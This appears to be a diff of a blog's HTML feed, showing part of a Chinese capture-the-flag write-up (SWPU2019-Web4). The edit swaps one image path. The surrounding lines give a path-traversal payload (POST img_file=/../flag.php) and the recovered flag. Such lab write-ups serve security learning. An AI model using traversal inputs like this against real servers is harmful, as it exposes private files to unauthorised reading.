@@ -280,7 +280,7 @@
 <h2 id="0x05-我们构造playload为"><strong>0x05 我们构造playload为</strong></h2>
 <p>GET: <strong><code>index.php?r=User/Index</code></strong></p>
 <p>POST: <strong><code>img_file=/../flag.php</code></strong></p>
-<p><img src="/2021/04/14/SWPU2019-Web4/3-1618488205319.png" alt="3"></p>
+<p><img src="/2021/04/14/SWPU2019-Web4/5.png" alt="5"></p>
 <p><img src="/2021/04/14/SWPU2019-Web4/4.png" alt="4"></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;68b619e4-47d7-4e76-b823-26dd0e110c68&#125;</span><br></pre></td></tr></table></figure>
 ]]></content>
